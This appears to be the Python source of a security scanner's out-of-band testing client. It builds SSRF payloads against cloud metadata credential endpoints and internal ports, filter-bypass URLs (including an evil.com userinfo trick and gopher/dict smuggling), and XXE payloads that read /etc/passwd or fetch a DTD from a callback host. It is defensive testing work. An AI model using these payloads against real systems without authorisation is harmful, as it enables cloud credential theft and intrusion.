"""
HackerPA Engine - Out-of-Band Application Security Testing (OAST) Client

Provides unique callback URLs and payloads for detecting blind
vulnerabilities (SSRF, XXE, RCE, etc.) where the application makes an
outbound request to an attacker-controlled endpoint.

Supports three modes:
  1. **External callback** - Uses a configurable callback URL (e.g. a
     webhook.site, Burp Collaborator, or self-hosted listener) set via
     the ``OAST_CALLBACK_URL`` environment variable.
  2. **Cloud metadata probing** - Generates payloads targeting well-known
     internal endpoints (AWS/GCP/Azure metadata, localhost ports) and
     checks the response for evidence that the server fetched them.
  3. **DNS canary** - Generates unique sub-domain tokens under a
     configurable base domain for DNS-based out-of-band detection.

Usage
-----
::

    from engine.scanners.oast_client import OASTClient

    client = OASTClient(scan_id="abc123")

    # Get SSRF payloads enriched with OAST callback URLs
    payloads = client.get_ssrf_payloads()

    # After sending payloads, check if any callback was received
    hits = client.check_callbacks()

    # Analyse a server response for evidence of internal fetch
    evidence = client.analyse_response(response_text, payload_tag="aws_meta")
"""

import hashlib
import logging
import os
import re
import time
import uuid
from typing import Any, Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Configuration from environment
# ---------------------------------------------------------------------------

# External callback service URL (e.g. https://webhook.site/<uuid>,
# https://<id>.oastify.com, or a self-hosted listener).
# When set, the client generates payloads that point here.
OAST_CALLBACK_URL: str = os.environ.get("OAST_CALLBACK_URL", "")

# Base domain for DNS canary tokens.  If set, the client creates payloads
# like ``http://{token}.{OAST_DNS_BASE_DOMAIN}/`` and the operator is
# expected to monitor DNS queries hitting that zone.
OAST_DNS_BASE_DOMAIN: str = os.environ.get("OAST_DNS_BASE_DOMAIN", "")

# Optional API endpoint to poll for received callbacks (e.g. webhook.site
# API).  Must return JSON with a list of requests.
OAST_POLL_URL: str = os.environ.get("OAST_POLL_URL", "")

# Optional API token for the polling endpoint.
OAST_POLL_TOKEN: str = os.environ.get("OAST_POLL_TOKEN", "")

# ---------------------------------------------------------------------------
# Cloud metadata endpoints (read-only, non-destructive)
# ---------------------------------------------------------------------------

CLOUD_METADATA_PAYLOADS: list[dict[str, str]] = [
    # AWS EC2 Instance Metadata Service (IMDSv1)
    {
        "tag": "aws_meta",
        "url": "http://169.254.169.254/latest/meta-data/",
        "description": "AWS EC2 metadata (IMDSv1)",
    },
    {
        "tag": "aws_iam",
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "description": "AWS IAM role credentials via metadata",
    },
    {
        "tag": "aws_userdata",
        "url": "http://169.254.169.254/latest/user-data/",
        "description": "AWS EC2 user-data (may contain secrets)",
    },
    # GCP Compute Engine metadata
    {
        "tag": "gcp_meta",
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "description": "GCP Compute Engine metadata",
    },
    {
        "tag": "gcp_token",
        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "description": "GCP service account OAuth token",
    },
    # Azure Instance Metadata Service
    {
        "tag": "azure_meta",
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "description": "Azure Instance Metadata Service",
    },
    # DigitalOcean metadata
    {
        "tag": "do_meta",
        "url": "http://169.254.169.254/metadata/v1/",
        "description": "DigitalOcean Droplet metadata",
    },
]

# Localhost / internal port probing
INTERNAL_PROBE_PAYLOADS: list[dict[str, str]] = [
    {"tag": "localhost_80", "url": "http://127.0.0.1:80", "description": "Localhost HTTP"},
    {"tag": "localhost_443", "url": "http://127.0.0.1:443", "description": "Localhost HTTPS"},
    {"tag": "localhost_8080", "url": "http://127.0.0.1:8080", "description": "Localhost 8080"},
    {"tag": "localhost_3000", "url": "http://127.0.0.1:3000", "description": "Localhost 3000"},
    {"tag": "localhost_6379", "url": "http://127.0.0.1:6379", "description": "Redis"},
    {"tag": "localhost_5432", "url": "http://127.0.0.1:5432", "description": "PostgreSQL"},
    {"tag": "localhost_27017", "url": "http://127.0.0.1:27017", "description": "MongoDB"},
    {"tag": "localhost_9200", "url": "http://127.0.0.1:9200", "description": "Elasticsearch"},
    {"tag": "localhost_8500", "url": "http://127.0.0.1:8500", "description": "Consul"},
]

# SSRF bypass technique templates.  ``{TARGET}`` is replaced with the
# actual target URL (e.g. ``169.254.169.254``).
SSRF_BYPASS_TEMPLATES: list[dict[str, str]] = [
    # URL parser confusion (userinfo before host)
    {
        "tag": "bypass_at_sign",
        "template": "http://evil.com@{TARGET}",
        "description": "URL parser confusion via @ in userinfo",
    },
    # IPv6 mapped IPv4
    {
        "tag": "bypass_ipv6_mapped",
        "template": "http://[::ffff:127.0.0.1]/",
        "description": "IPv6-mapped IPv4 (::ffff:127.0.0.1)",
    },
    {
        "tag": "bypass_ipv6_loopback",
        "template": "http://[::1]/",
        "description": "IPv6 loopback",
    },
    # Decimal / hex / octal IP encoding
    {
        "tag": "bypass_decimal_ip",
        "template": "http://2130706433/",
        "description": "127.0.0.1 as decimal integer",
    },
    {
        "tag": "bypass_hex_ip",
        "template": "http://0x7f000001/",
        "description": "127.0.0.1 as hexadecimal",
    },
    {
        "tag": "bypass_octal_ip",
        "template": "http://017700000001/",
        "description": "127.0.0.1 as octal",
    },
    {
        "tag": "bypass_short_ip",
        "template": "http://127.1/",
        "description": "127.0.0.1 short form",
    },
    # Double URL encoding
    {
        "tag": "bypass_double_encode",
        "template": "http://127.0.0.1/%252f",
        "description": "Double URL-encoded path separator",
    },
    # Protocol smuggling
    {
        "tag": "bypass_gopher",
        "template": "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0d%0a%0d%0a",
        "description": "Gopher protocol smuggling",
    },
    {
        "tag": "bypass_dict",
        "template": "dict://127.0.0.1:6379/INFO",
        "description": "DICT protocol to Redis",
    },
    {
        "tag": "bypass_file_unix",
        "template": "file:///etc/passwd",
        "description": "Local file read (Unix)",
    },
    {
        "tag": "bypass_file_win",
        "template": "file:///c:/windows/system.ini",
        "description": "Local file read (Windows)",
    },
    # DNS rebinding indicator
    {
        "tag": "bypass_dns_rebind",
        "template": "http://127.0.0.1.nip.io/",
        "description": "DNS rebinding via nip.io",
    },
    # Redirect-based bypass
    {
        "tag": "bypass_redirect",
        "template": "http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/",
        "description": "Open redirect to cloud metadata",
    },
]

# ---------------------------------------------------------------------------
# Response analysis patterns
# ---------------------------------------------------------------------------

# Patterns that indicate a server fetched an internal/cloud resource
CLOUD_EVIDENCE_PATTERNS: dict[str, list[str]] = {
    "aws_meta": [
        r"ami-[a-f0-9]{8,}",
        r"instance-id",
        r"iam/security-credentials",
        r"local-ipv4",
        r"public-hostname",
        r"placement/availability-zone",
        r"AccessKeyId",
        r"SecretAccessKey",
    ],
    "gcp_meta": [
        r"computeMetadata",
        r"project/project-id",
        r"instance/zone",
        r"service-accounts/default",
        r"access_token",
    ],
    "azure_meta": [
        r'"vmId"',
        r'"subscriptionId"',
        r'"resourceGroupName"',
        r"Metadata.*instance",
    ],
    "file_read": [
        r"root:x?:0:0:",           # /etc/passwd
        r"\[drivers\]",             # system.ini
        r"\[extensions\]",          # system.ini
    ],
    "internal_service": [
        r"Connection refused",
        r"Connection timed out",
        r"ECONNREFUSED",
        r"ETIMEDOUT",
        r"No route to host",
        r"getaddrinfo",
        r"curl_exec",
        r"file_get_contents",
        r"urllib",
        r"java\.net\.ConnectException",
        r"requests\.exceptions",
    ],
}


# ---------------------------------------------------------------------------
# OAST Client
# ---------------------------------------------------------------------------

class OASTClient:
    """Provides unique callback URLs for detecting blind vulnerabilities.

    Uses a hybrid approach: generates unique token URLs pointing to a
    configurable external callback service (when available) and also
    provides cloud metadata / internal probing payloads with response
    analysis for environments where an external callback is not feasible.

    Parameters
    ----------
    scan_id : str
        The scan identifier, used for generating unique tokens.
    """

    def __init__(self, scan_id: str) -> None:
        self.scan_id = scan_id
        self._tokens: dict[str, str] = {}  # tag -> token
        self._token_timestamps: dict[str, float] = {}  # token -> creation time
        self._has_callback = bool(OAST_CALLBACK_URL)
        self._has_dns = bool(OAST_DNS_BASE_DOMAIN)

        if self._has_callback:
            logger.info("OAST callback URL configured: %s", OAST_CALLBACK_URL)
        if self._has_dns:
            logger.info("OAST DNS base domain configured: %s", OAST_DNS_BASE_DOMAIN)
        if not self._has_callback and not self._has_dns:
            logger.info(
                "No external OAST endpoint configured. "
                "Using cloud metadata probing and response analysis only. "
                "Set OAST_CALLBACK_URL or OAST_DNS_BASE_DOMAIN for blind detection."
            )

    # ------------------------------------------------------------------
    # Token generation
    # ------------------------------------------------------------------

    def _generate_token(self, tag: str) -> str:
        """Generate a unique, deterministic-ish token for the given tag.

        The token encodes the scan ID and tag so that callbacks can be
        correlated back to the specific test.
        """
        if tag in self._tokens:
            return self._tokens[tag]

        raw = f"hackerpa-{self.scan_id}-{tag}-{uuid.uuid4().hex[:8]}"
        # Create a short, URL-safe hash
        token = hashlib.sha256(raw.encode()).hexdigest()[:16]
        self._tokens[tag] = token
        self._token_timestamps[token] = time.time()
        return token

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------

    def get_callback_url(self, tag: str) -> Optional[str]:
        """Return an OAST callback URL for the given *tag*, or None if
        no external callback is configured.

        The URL includes a unique token so that hits can be correlated.
        """
        token = self._generate_token(tag)

        if self._has_callback:
            base = OAST_CALLBACK_URL.rstrip("/")
            return f"{base}/{token}"
        return None

    def get_dns_canary(self, tag: str) -> Optional[str]:
        """Return a DNS canary hostname for the given *tag*, or None if
        no DNS base domain is configured.

        Example: ``abc123def456.oast.hackerpa.example.com``
        """
        token = self._generate_token(tag)

        if self._has_dns:
            return f"{token}.{OAST_DNS_BASE_DOMAIN}"
        return None

    def get_ssrf_payloads(self) -> list[dict[str, str]]:
        """Return a comprehensive list of SSRF payloads including:
        - Cloud metadata endpoints
        - Internal port probing URLs
        - SSRF bypass techniques
        - OAST callback URLs (if configured)
        - DNS canary URLs (if configured)

        Each entry is a dict with keys: tag, url, description.
        """
        payloads: list[dict[str, str]] = []

        # 1. Cloud metadata
        payloads.extend(CLOUD_METADATA_PAYLOADS)

        # 2. Internal probes
        payloads.extend(INTERNAL_PROBE_PAYLOADS)

        # 3. Bypass techniques
        for bypass in SSRF_BYPASS_TEMPLATES:
            payloads.append({
                "tag": bypass["tag"],
                "url": bypass["template"],  # Already contains the target
                "description": bypass["description"],
            })

        # 4. OAST callback payloads (if configured)
        if self._has_callback:
            callback_tags = [
                "oast_http_get",
                "oast_http_post",
                "oast_ssrf_blind",
            ]
            for cb_tag in callback_tags:
                url = self.get_callback_url(cb_tag)
                if url:
                    payloads.append({
                        "tag": cb_tag,
                        "url": url,
                        "description": f"OAST callback ({cb_tag})",
                    })

        # 5. DNS canary payloads (if configured)
        if self._has_dns:
            dns_tags = [
                "oast_dns_ssrf",
                "oast_dns_xxe",
                "oast_dns_rce",
            ]
            for dns_tag in dns_tags:
                hostname = self.get_dns_canary(dns_tag)
                if hostname:
                    payloads.append({
                        "tag": dns_tag,
                        "url": f"http://{hostname}/",
                        "description": f"DNS canary ({dns_tag})",
                    })

        return payloads

    def get_xxe_payloads(self) -> list[dict[str, str]]:
        """Return XML External Entity payloads using OAST callbacks.

        These payloads attempt to trigger an outbound request from the
        XML parser via external entity resolution.
        """
        payloads: list[dict[str, str]] = []

        # DTD-based XXE with callback
        callback_url = self.get_callback_url("oast_xxe_dtd")
        if callback_url:
            payloads.append({
                "tag": "xxe_dtd_callback",
                "payload": (
                    f'<?xml version="1.0" encoding="UTF-8"?>'
                    f'<!DOCTYPE foo ['
                    f'<!ENTITY xxe SYSTEM "{callback_url}">'
                    f']>'
                    f'<root>&xxe;</root>'
                ),
                "description": "XXE with external DTD entity to OAST callback",
            })

        # Parameter entity XXE with DNS canary
        dns_host = self.get_dns_canary("oast_xxe_dns")
        if dns_host:
            payloads.append({
                "tag": "xxe_dns_canary",
                "payload": (
                    f'<?xml version="1.0" encoding="UTF-8"?>'
                    f'<!DOCTYPE foo ['
                    f'<!ENTITY % xxe SYSTEM "http://{dns_host}/evil.dtd">'
                    f'%xxe;'
                    f']>'
                    f'<root>test</root>'
                ),
                "description": "XXE with parameter entity to DNS canary",
            })

        # File read via XXE (no callback needed)
        payloads.append({
            "tag": "xxe_file_read",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<!DOCTYPE foo ['
                '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
                ']>'
                '<root>&xxe;</root>'
            ),
            "description": "XXE local file read (/etc/passwd)",
        })

        return payloads

    # ------------------------------------------------------------------
    # Callback polling
    # ------------------------------------------------------------------

    def check_callbacks(self) -> list[dict[str, Any]]:
        """Poll the OAST callback endpoint for received requests.

        Returns a list of dicts, each with keys: token, tag, timestamp.
        Only returns hits whose token matches one of our generated tokens.

        Requires ``OAST_POLL_URL`` to be set.  If not configured, returns
        an empty list.
        """
        if not OAST_POLL_URL:
            logger.debug("No OAST_POLL_URL configured, skipping callback check")
            return []

        hits: list[dict[str, Any]] = []

        try:
            import requests as req

            headers: dict[str, str] = {"Accept": "application/json"}
            if OAST_POLL_TOKEN:
                headers["Authorization"] = f"Bearer {OAST_POLL_TOKEN}"

            resp = req.get(OAST_POLL_URL, headers=headers, timeout=10)
            if resp.status_code != 200:
                logger.warning(
                    "OAST poll returned status %d: %s",
                    resp.status_code,
                    resp.text[:200],
                )
                return []

            data = resp.json()

            # Handle common response formats
            entries: list[dict] = []
            if isinstance(data, list):
                entries = data
            elif isinstance(data, dict):
                # webhook.site returns {"data": [...]}
                entries = data.get("data", data.get("requests", []))

            # Reverse lookup: token -> tag
            token_to_tag = {v: k for k, v in self._tokens.items()}

            for entry in entries:
                # Try to extract the token from the request URL or body
                entry_url = entry.get("url", "") or entry.get("path", "")
                entry_body = entry.get("body", "") or entry.get("content", "")
                combined = f"{entry_url} {entry_body}"

                for token, tag in token_to_tag.items():
                    if token in combined:
                        hits.append({
                            "token": token,
                            "tag": tag,
                            "timestamp": entry.get("created_at", entry.get("timestamp", "")),
                            "source_ip": entry.get("ip", entry.get("source_ip", "")),
                            "raw": entry,
                        })

        except ImportError:
            logger.warning("requests library not available for OAST polling")
        except Exception as exc:
            logger.warning("Error polling OAST callbacks: %s", exc)

        if hits:
            logger.info("OAST: %d callback hit(s) detected", len(hits))

        return hits

    # ------------------------------------------------------------------
    # Response analysis
    # ------------------------------------------------------------------

    def analyse_response(
        self,
        response_text: str,
        payload_tag: str = "",
    ) -> dict[str, Any]:
        """Analyse a server response for evidence that it fetched an
        internal or cloud resource.

        Parameters
        ----------
        response_text : str
            The HTTP response body to analyse.
        payload_tag : str, optional
            The tag of the payload that was sent (e.g. ``"aws_meta"``),
            used to select the most relevant evidence patterns.

        Returns
        -------
        dict
            Keys:
            - ``matched`` (bool): True if evidence was found.
            - ``category`` (str): The category of evidence (e.g. ``"aws_meta"``).
            - ``patterns`` (list[str]): The specific patterns that matched.
            - ``snippet`` (str): A short excerpt of the response containing the match.
        """
        result: dict[str, Any] = {
            "matched": False,
            "category": "",
            "patterns": [],
            "snippet": "",
        }

        if not response_text:
            return result

        # Determine which pattern groups to check
        if payload_tag and payload_tag in CLOUD_EVIDENCE_PATTERNS:
            groups_to_check = {payload_tag: CLOUD_EVIDENCE_PATTERNS[payload_tag]}
        else:
            groups_to_check = CLOUD_EVIDENCE_PATTERNS

        for category, patterns in groups_to_check.items():
            for pattern in patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    result["matched"] = True
                    result["category"] = category
                    result["patterns"].append(pattern)

                    # Extract snippet around the match
                    start = max(0, match.start() - 50)
                    end = min(len(response_text), match.end() + 50)
                    snippet = response_text[start:end]
                    if start > 0:
                        snippet = "..." + snippet
                    if end < len(response_text):
                        snippet = snippet + "..."
                    result["snippet"] = snippet

        return result

    def analyse_timing(
        self,
        baseline_time: float,
        test_time: float,
        threshold_factor: float = 3.0,
    ) -> dict[str, Any]:
        """Detect potential blind SSRF via timing analysis.

        If the response time with the SSRF payload is significantly longer
        than the baseline, it may indicate the server is fetching the URL.

        Parameters
        ----------
        baseline_time : float
            Response time (seconds) for a normal request.
        test_time : float
            Response time (seconds) for the request with the SSRF payload.
        threshold_factor : float
            How many times slower the test must be to flag it (default 3x).

        Returns
        -------
        dict
            Keys:
            - ``suspicious`` (bool): True if timing anomaly detected.
            - ``baseline_ms`` (int): Baseline time in milliseconds.
            - ``test_ms`` (int): Test time in milliseconds.
            - ``factor`` (float): How many times slower the test was.
        """
        if baseline_time <= 0:
            baseline_time = 0.001  # Avoid division by zero

        factor = test_time / baseline_time

        return {
            "suspicious": factor >= threshold_factor and test_time > 1.0,
            "baseline_ms": int(baseline_time * 1000),
            "test_ms": int(test_time * 1000),
            "factor": round(factor, 2),
        }

    # ------------------------------------------------------------------
    # Token lookup helpers
    # ------------------------------------------------------------------

    def get_tag_for_token(self, token: str) -> Optional[str]:
        """Reverse-lookup: given a token, return the tag it was generated for."""
        token_to_tag = {v: k for k, v in self._tokens.items()}
        return token_to_tag.get(token)

    def get_all_tokens(self) -> dict[str, str]:
        """Return a copy of all generated tokens: {tag: token}."""
        return dict(self._tokens)
